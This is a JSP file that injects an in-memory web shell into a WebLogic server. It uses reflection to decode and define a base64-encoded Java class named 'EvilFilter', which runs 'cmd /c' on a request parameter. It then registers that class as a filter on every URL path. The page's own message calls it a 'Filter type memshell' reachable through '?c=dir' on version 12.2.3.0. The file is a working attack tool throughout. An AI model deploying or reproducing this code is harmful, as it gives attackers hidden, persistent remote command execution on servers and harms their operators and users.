<%--
  Created by IntelliJ IDEA.
  User: Jack
  Date: 6/29/2023
  Time: 1:40 PM
  To change this template use File | Settings | File Templates.
--%>
<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="weblogic.servlet.internal.FilterManager" %>
<%@ page import="weblogic.servlet.internal.ServletRequestImpl" %>
<%@ page import="weblogic.servlet.internal.WebAppServletContext" %>
<%@ page import="javax.servlet.ServletException" %>
<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%



    response.getWriter().write("test!!!");
    Thread thread = Thread.currentThread();
    try {
    Field workEntry = Class.forName("weblogic.work.ExecuteThread").getDeclaredField("workEntry");
    workEntry.setAccessible(true);
    Object workentry  = workEntry.get(thread);

    Field connectionHandler = workentry.getClass().getDeclaredField("connectionHandler");
    connectionHandler.setAccessible(true);
    Object http = connectionHandler.get(workentry);

    Field request1 = http.getClass().getDeclaredField("request");
    request1.setAccessible(true);
    ServletRequestImpl servletRequest = (ServletRequestImpl)request1.get(http);

    response.getWriter().write("Success!!!");
    Field context = servletRequest.getClass().getDeclaredField("context");
    context.setAccessible(true);
    WebAppServletContext webAppServletContext = (WebAppServletContext)context.get(servletRequest);

    String encode_class ="yv66vgAAADIAmgoAHgBNCQBOAE8IAFAKAFEAUggAUwcAVAgAVQsABgBWBwBXCABYCgAJAFkKAAkAWgoAWwBcCgAJAF0KAFsAXgoAXwBgBwBhCgARAGIIAGMKABEAZAoAEQBlCgARAGYIAGcLAGgAaQoAagBrCgBqAGwLAG0AbggAbwcAcAcAcQcAcgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAUTEZpbHRlcnMvRXZpbEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwBzAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHY29tbWFuZAEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAB3NjYW5uZXIBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQANU3RhY2tNYXBUYWJsZQcAcAcAdAcAdQcAdgcAVAcAVwcAdwcAYQcAeAcAeQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAPRXZpbEZpbHRlci5qYXZhDAAgACEHAHoMAHsAfAEAEmV2aWwgRmlsdGVyIOWIm+W7ugcAfQwAfgB/AQAeZXZpbCBmaWx0ZXIg5omn6KGM6L+H5ruk6L+H56iLAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAAWMMAIAAgQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAHY21kIC9jIAwAIAB/DACCAIMHAIQMAIUAhgwAhwCIDACJAIoHAIsMAIwAjQEAEWphdmEvdXRpbC9TY2FubmVyDAAgAI4BAAJcYQwAjwCQDACRAJIMAJMAiAEAAAcAdQwAlACVBwCWDACXAH8MAJgAIQcAdgwALQCZAQAVZXZpbCBmaWx0ZXIg6ZSA5q+B77yBAQASRmlsdGVycy9FdmlsRmlsdGVyAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAFZmx1c2gBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEAHQAeAAEAHwAAAAQAAQAgACEAAQAiAAAALwABAAEAAAAFKrcAAbEAAAACACMAAAAGAAEAAAANACQAAAAMAAEAAAAFACUAJgAAAAEAJwAoAAIAIgAAAEEAAgACAAAACbIAAhIDtgAEsQAAAAIAIwAAAAoAAgAAABAACAARACQAAAAWAAIAAAAJACUAJgAAAAAACQApACoAAQArAAAABAABACwAAQAtAC4AAgAiAAABXgADAAkAAACGsgACEgW2AAQrwAAGOgQZBBIHuQAIAgDGAGa7AAlZEgq3AAs6BRkFGQQSB7kACAIAtgAMV7gADRkFtgAOtgAPtgAQOga7ABFZGQa3ABISE7YAFDoHGQe2ABWZAAsZB7YAFqcABRIXOggsuQAYAQAZCLYAGSy5ABgBALYAGrEtKyy5ABsDALEAAAADACMAAAA2AA0AAAAVAAgAFwAOABgAGgAZACUAGgA0ABsARAAcAFQAHQBoAB4AcwAfAHwAIAB9ACMAhQAkACQAAABcAAkAJQBYAC8AMAAFAEQAOQAxADIABgBUACkAMwA0AAcAaAAVADUANgAIAAAAhgAlACYAAAAAAIYANwA4AAEAAACGADkAOgACAAAAhgA7ADwAAwAOAHgAPQA+AAQAPwAAACgAA/8AZAAIBwBABwBBBwBCBwBDBwBEBwBFBwBGBwBHAABBBwBI+AAWACsAAAAGAAIASQAsAAEASgAhAAEAIgAAADcAAgABAAAACbIAAhIctgAEsQAAAAIAIwAAAAoAAgAAACgACAApACQAAAAMAAEAAAAJACUAJgAAAAEASwAAAAIATA==";
    byte[] decode_class = new BASE64Decoder().decodeBuffer(encode_class);
    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
    defineClass.setAccessible(true);
    Class filter_class = (Class) defineClass.invoke(webAppServletContext.getClassLoader(), decode_class, 0, decode_class.length);
    Field classLoader = webAppServletContext.getClass().getDeclaredField("classLoader");
    classLoader.setAccessible(true);
    ClassLoader  classLoader1  =(ClassLoader)classLoader.get(webAppServletContext);

    Field cachedClasses = classLoader1.getClass().getDeclaredField("cachedClasses");
    cachedClasses.setAccessible(true);
    Object cachedClasses_map = cachedClasses.get(classLoader1);
    Method get = cachedClasses_map.getClass().getDeclaredMethod("get", Object.class);
    get.setAccessible(true);
    if (get.invoke(cachedClasses_map, "cmdFilter") == null) {

    Method put = cachedClasses_map.getClass().getMethod("put", Object.class, Object.class);
    put.setAccessible(true);
    put.invoke(cachedClasses_map, "cmdFilter", filter_class);

    Field filterManager = webAppServletContext.getClass().getDeclaredField("filterManager");
    filterManager.setAccessible(true);
    Object o = filterManager.get(webAppServletContext);

    Method registerFilter = o.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
    registerFilter.setAccessible(true);
    registerFilter.invoke(o, "test", "cmdFilter", new String[]{"/*"}, null, null, null);


    response.getWriter().write("done!!!");
    response.getWriter().write("\n this page inject the Filter type memshell, it can be accessed with /weblogic_pro/hello?c=dir. It works on 12.2.3.0 version.");
    }





    } catch (NoSuchFieldException e) {
    e.printStackTrace();
    } catch (ClassNotFoundException e) {
    e.printStackTrace();
    } catch (IllegalAccessException e) {
    e.printStackTrace();
    } catch (NoSuchMethodException e) {
    e.printStackTrace();
    } catch (InvocationTargetException e) {
    e.printStackTrace();
    }





%>
